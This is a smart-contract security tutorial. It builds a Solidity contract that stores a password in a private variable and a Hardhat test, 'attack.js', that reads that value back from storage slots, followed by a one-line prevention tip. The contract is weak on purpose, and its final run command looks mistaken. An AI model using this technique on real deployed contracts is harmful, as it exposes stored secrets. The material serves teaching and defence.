# Access-Private-Data

Did you know that all data on the smart contract can be read?

Lets see!!!

---

## Requirements

- Contract will take in `password` as a variable in its contructor and will set it equal to a private variable
  in the contract
- User should somehow be able to access the private variable

## Concepts

- Contracts have about `2 ** 256` storage slots
- Each storage spot is of 32 bytes(256 bits)
- Data is stored sequentially in the order of declaration
- Storage is optimized such that if bunch of variables can fit in one slot, they are put in the same slot

---

## Build

To build the smart contract we will be using [Hardhat](https://hardhat.org/).
Hardhat is an Ethereum development environment and framework designed for full stack development in Solidity. In simple words you can write your smart contract, deploy them, run tests, and debug your code.

- In you folder, you will set up a Hardhat project

```bash
npm init --yes
npm install --save-dev hardhat
```

- In the same directory where you installed Hardhat run:

  ```bash
  npx hardhat
  ```

  - Select `Create a basic sample project`
  - Press enter for the already specified `Hardhat Project root`
  - Press enter for the question on if you want to add a `.gitignore`
  - Press enter for `Do you want to install this sample project's dependencies with npm (@nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers)?`

Now you have a hardhat project ready to go!

If you are not on mac, please do this extra step and install these libraries as well :)

```bash
npm install --save-dev @nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers
```

- Now lets start by creating a `Login.sol` file inside the `contracts` folder. Add the following lines of code
  to your file

```go
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.4;

    contract Login {

        // Private variables
        // slot 0 - One bytes 32 variable would occupy 1 slot
        // because bytes32 variable has 256 bits(32*8)
        // which is the size of 1 slot
        bytes32 private username;
        // slot 1
        bytes32 private password;

        constructor(bytes32  _username, bytes32  _password) {
            username = _username;
            password = _password;
        }
    }
```

- Now lets try to understand how the variables are stored inside this contract

  - There are two variables - username, password and both are private variables
  - Variables are stored in storage slots within the EVM for a given contract
  - Each slot can store upto 256 bits and bytes32 requires 256 bits `(32*8 = 256)`
  - So each bytes32 variable will be stored in a new slot
  - Also remember, data is stored sequentially
  - Because of this reason, `username` would be stored in `slot 0` and password
    would be stored in `slot 1`

- Now lets try to write a test which demostrates how we can retrieve these private variables from the contract

- Create a new file `attack.js` inside the `test` folder and add the following lines of code

```javascript
const { ethers, waffle } = require("hardhat");
const { expect } = require("chai");

describe("Attack", function () {
  it("Should be able to read the private variables password and username", async function () {
    // Deploy the login contract
    const Login = await ethers.getContractFactory("Login");
    // To save space, we would convert the string to bytes32 array
    let usernameBytes = ethers.utils.formatBytes32String("test");
    let passwordBytes = ethers.utils.formatBytes32String("password");
    const _login = await Login.deploy(usernameBytes, passwordBytes);
    await _login.deployed();

    console.log("Login contract address", _login.address);

    // Get the storage at storage slot 0,1
    const provider = waffle.provider;
    usernameBytes = await provider.getStorageAt(_login.address, 0);
    passwordBytes = await provider.getStorageAt(_login.address, 1);

    // We are able to extract the values of the private variables
    expect(ethers.utils.parseBytes32String(usernameBytes)).to.equal("test");
    expect(ethers.utils.parseBytes32String(passwordBytes)).to.equal("password");
  });
});
```

- Finally, lets run this test and see if it works. On your terminal type:

  ```bash
  npx hardhat run
  ```

  Wow, we could actually read the password!!! LFG!!

## Prevention

- Dont store private information on chain
